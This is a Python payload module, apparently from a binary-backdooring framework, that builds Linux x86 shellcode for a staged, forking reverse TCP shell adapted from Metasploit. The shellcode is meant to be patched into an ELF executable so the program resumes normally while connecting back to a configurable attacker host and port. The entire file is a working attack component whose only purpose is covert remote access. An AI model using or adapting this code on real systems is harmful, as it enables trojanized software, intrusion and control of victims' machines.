import struct
import os
import logging
from core import support
logger = logging.getLogger(__name__)
#eat_code_caves function is arch agnostic?
from common import common

class fork_reverse_shell_tcp_staged():

    def __init__(self):
        #could take this out HOST/PORT and put into each shellcode function
        #self.HOST = HOST
        #self.PORT = PORT
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = "fork_reverse_shell_tcp_staged"
        self.description = """Staged payload reverse tcp payload from metasploit"""
        self.requirements = {'MODE':'How the patching will happen',
                             'HOST':'<HOST to connect back to>',
                             'PORT':'<Port to connect back to>',
                             'ENCODER': '<Encoder you want to use, else none>'
                            }
        self.supported_modes = ['text_splitting']
        self.shellcode = ""
        self.apis_needed = None
        self.payload_type = 'single'

        
    def invoke(self, PM):
        # Expose patching method objects
        
        self.PM = PM
        # Expose BDF method objects
        self.BDF = self.PM.BDF
        logger.debug(f"IN PAYLOAD DEBUG: {dir(self)}")
        if support.support(self).check_reqs() is False:
            return False
        return self.run()

    def run(self): #flItms, CavesPicked={}):
        """
        FOR USE WITH STAGER TCP PAYLOADS INCLUDING METERPRETER
        Modified from metasploit payload/linux/x64/shell/reverse_tcp
        to correctly fork the shellcode payload and continue normal execution.
        """

        self.shellcode = b"\x6a\x02\x58\xcd\x80\x85\xc0\x74\x07"
        #will need to put resume execution shellcode here
        self.shellcode += b"\xbd"
        self.shellcode += struct.pack("<I", self.PM.BDF.elf_object['e_entry'])
        self.shellcode += b"\xff\xe5"
        self.shellcode += bytes("\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\xb0\x66\x89\xe1\xcd\x80"
                            "\x97\x5b\x68", 'iso-8859-1')
        #HOST
        self.shellcode += common.pack_ip_addresses(self.HOST)
        self.shellcode += b"\x68\x02\x00"
        #PORT
        self.shellcode += struct.pack("!H", int(self.PORT))
        self.shellcode += bytes("\x89\xe1\x6a"
                            "\x66\x58\x50\x51\x57\x89\xe1\x43\xcd\x80\xb2\x07\xb9\x00\x10"
                            "\x00\x00\x89\xe3\xc1\xeb\x0c\xc1\xe3\x0c\xb0\x7d\xcd\x80\x5b"
                            "\x89\xe1\x99\xb6\x0c\xb0\x03\xcd\x80\xff\xe1", 'iso-8859-1')

        return self.shellcode
